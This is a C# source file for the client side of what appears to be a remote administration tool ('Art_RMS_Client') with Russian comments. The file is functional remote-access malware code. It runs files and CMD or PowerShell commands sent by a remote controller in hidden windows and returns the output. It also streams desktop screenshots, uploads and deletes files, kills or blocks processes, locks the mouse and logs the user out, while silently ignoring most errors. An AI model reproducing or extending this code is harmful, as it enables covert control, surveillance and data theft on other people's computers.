using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO.Compression;

namespace Art_RMS_Client.Pages
{
    class Functions
    {
        public static List<Thread> Thread_Functions = new List<Thread>();

        [DllImport("user32.dll")]
        private static extern bool LockWorkStation();
        [DllImport("user32.dll")]
        private static extern bool ExitWindowsEx(uint uFlags);


        public static void Send(string Message)
        {
            try
            {
                byte[] buffer = Encoding.UTF8.GetBytes(Message);
                Listener.Stream.Write(buffer, 0, buffer.Length);
            }
            catch { }
        }
        public static void Send(string Message, byte[] file)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(Message);
            buffer = buffer.Concat(file).ToArray();
            Listener.Stream.Write(buffer, 0, buffer.Length);
        }


        #region Functions
        public static void Run_File(int Type_run, string Type_file, byte[] Get_file)
        {
            try
            {
                Send("STATUS|Run File");
                int Random_Name = new Random().Next(2555);
                File.WriteAllBytes(Path.GetTempPath() + Random_Name + "." + Type_file, Get_file);
                Process Run = new Process();
                Run.StartInfo.FileName = Path.GetTempPath() + Random_Name + "." + Type_file;
                if(Type_run == 1)
                    Run.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Run.Start();
            }
            catch { Send("STATUS|ERROR Run File"); }
        } // Запуск файла
        public static void Sleep_pc()
        {
            Send("STATUS|Sleep pc");
            LockWorkStation();
        } //Войти в спящий режим
        public static void Log_out_pc()
        {
            Send("STATUS|LogOut PC");
            ExitWindowsEx(0);
        } //Выйти из пользователя
        public static void Block_Mouse()
        {
            Send("STATUS|Block Mouse");
            while (true)
            {
                Thread.Sleep(250);
                Cursor.Position = new Point(0, 0);
            }
        } //Заблокировать мышь
        public static void Unlock_Mouse()
        {
            for (int i = 0; i < Thread_Functions.Count; i++)
            {
                if (Thread_Functions[i].Name == "Block_Mouse")
                {
                    Thread_Functions[i].Abort();
                    Thread_Functions.RemoveAt(i);
                    break;
                }
            }
        }// Разблокировать мышь
        public static void Open_URL(string URL)
        {
            try
            {
                Send("STATUS|URL opened - " + URL);
                Process.Start(@URL);
            }
            catch { Send("STATUS|Invalid link!"); }
        } //Открытие ссылки
        public static void Get_Task_List()
        {
            string response = "RESPONSE_TASK_MANAGER|";
            Process[] prcess = Process.GetProcesses();
            foreach (Process p in prcess)
            {
                response += p.Id + ":" + p.ProcessName + ":" + p.MainWindowTitle + "|";
            }
            Send(response);
        } // Response Task List
        public static void Get_Blocked_Peocesses()
        {
            string response = "RESPONSE_TASK_MANAGER|";
            try 
            {
                for(int i = 0; i < Thread_Functions.Count; i++)
                {
                    response += i + ":" + Thread_Functions[i].Name + ":-|";
                }
                Send(response);
            }
            catch { }
        } // Response Blocked Processes
        public static void Kill_Process(string id)
        {
            try
            {
                Process process = Process.GetProcessById(Convert.ToInt32(id));
                process.Kill();
            }
            catch { }
        } //Kill Process
        public static void Block_Process(string ProcessName)
        {       
            while (true)
            {
                try
                {
                    Thread.Sleep(2000);
                    Process[] prcess = Process.GetProcessesByName(ProcessName);
                    foreach (Process p in prcess)
                    {
                        p.Kill();
                    }
                }
                catch { break; }
            }
        } //Блокирует процесс
        public static void Unlock_Process(string ProcessName)
        {
            for(int i = 0; i < Thread_Functions.Count; i++)
            {
                if (Thread_Functions[i].Name == ProcessName)
                {
                    Thread_Functions[i].Abort();
                    Thread_Functions.RemoveAt(i);
                    Get_Blocked_Peocesses();
                    break;
                }
            }
        }// Разблокирует процесс
        public static void Get_File_Manager(string path)
        {
            try {
                string response = "RESPONSE_FILE_MANAGER|" + path + "|";
                if (path != "")
                {
                    DirectoryInfo dir = new DirectoryInfo(path);
                    foreach (DirectoryInfo dr in dir.GetDirectories())
                    {
                        response += dr.Name + ";|";
                    }
                    foreach (FileInfo file in dir.GetFiles())
                    {
                        response += file.Name + ";" + (file.Length / 1024) + "|";
                    }
                }
                else
                {
                    DriveInfo[] drives = DriveInfo.GetDrives();
                    foreach (DriveInfo dr in drives)
                    {
                        if (dr.IsReady)
                            response += dr.Name + ";" + (dr.TotalSize / 1024) + "|";
                    }
                }
                Send(response);
            }
            catch { }
        } //Получить файловый менеджер
        public static void Run_Local_File(string path, int Type_run)
        {
            try
            {
                Send("STATUS|Run File");
                Process Run = new Process();
                Run.StartInfo.FileName = path;
                if (Type_run == 1)
                    Run.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Run.Start();
            }
            catch { Send("STATUS|ERROR Run File"); }
        } //Запуск локального файла
        public static void Manipulation_with_File_OR_Dir(string function, string path)
        {
            try
            {
                switch (function)
                {
                    case "DELETE_FILE":
                        File.Delete(path);
                        break;
                    case "DELETE_DIRECTORY":
                        Directory.Delete(path, true);
                        break;
                    case "DOWNLOAD_FILE":
                        byte[] file = File.ReadAllBytes(path);
                        FileInfo fileinfo = new FileInfo(path);
                        Send("RESPONSE_FILE_FROM_CLIENT|"+ fileinfo.Name + "|", File.ReadAllBytes(path));
                        break;
                }
            }
            catch { }
        } //Файловый менеджер

        public static bool Resp_Desk = true;
        public static void Response_Dektop(string delay)
        {
            try {
                Bitmap img = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                byte[] pic;
                while (Resp_Desk)
                {
                    Thread.Sleep(Convert.ToInt32(delay));
                    Graphics Picture = Graphics.FromImage(img);
                    Picture.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    Picture.Dispose();
                    ImageConverter converter = new ImageConverter();
                    pic = (byte[])converter.ConvertTo(img, typeof(byte[]));
                    Send("RESPONSE_DESKTOP_IMAGE|", pic);
                }
            }
            catch { Stop_Response_Dektop(); }
        } // Показ рабочего стола
        public static void Stop_Response_Dektop()
        {
            for (int i = 0; i < Thread_Functions.Count; i++)
            {
                if (Thread_Functions[i].Name == "REMOTE_DESKTOP")
                {
                    Resp_Desk = false;
                    Thread_Functions[i].Abort();
                    Thread_Functions.RemoveAt(i);
                    break;
                }
            }
        } // Прекращения вещания рабочего стола

        private static Process cmd = null;
        public static void Remote_Command(string app, string command)
        {
            if (app == "CMD")
            {
                cmd = Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/c chcp 65001 &" + command,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true
                });
                Send("RESPONSE_REMOTE_COMMAND|" + cmd.StandardOutput.ReadToEnd());
                cmd.Close();
            }else if (app == "POWERSHELL")
            {
                cmd = Process.Start(new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "/command " + command,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true
                });
                Send("RESPONSE_REMOTE_COMMAND|" + cmd.StandardOutput.ReadToEnd());
                cmd.Close();
            }
        } //Удаленная командная строка

        #endregion
    }
}
